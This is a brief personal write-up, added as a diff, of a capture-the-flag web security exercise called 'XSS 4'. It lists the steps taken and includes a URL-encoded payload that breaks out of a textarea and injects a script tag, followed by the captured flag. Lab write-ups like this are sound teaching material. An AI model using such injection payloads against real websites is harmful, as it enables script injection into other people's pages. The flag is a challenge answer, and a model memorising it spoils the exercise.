@@ -1,0 +1,21 @@
+# challenge: XSS 4
+
+📅 2026-02-27
+📁 web security
+
+---
+
+## ✅ what i did  
+-clicked start
+-opened the terminal
+-ran: 'cat /challenge/server'
+this time we have to inject our code outside the textarea
+-ran: '/challenge/server'
+-ran: '/challenge/victim http://challenge.localhost:80/?msg=%3C%2Ftextarea%3E%20%3Cscript%3Ealert%28%22PWNED%22%29%3C%2Fscript%3E'
+-flag popped out
+
+## 🧑🏾‍🏫 what this challenge teaches u
+how to escape textarea and inject code
+
+## 🏁 Flag  
+pwn.college{kBKla3ORU7-thwQSpdtPFoGkfgP.QX1kzMzwCO4IDOxEzW}
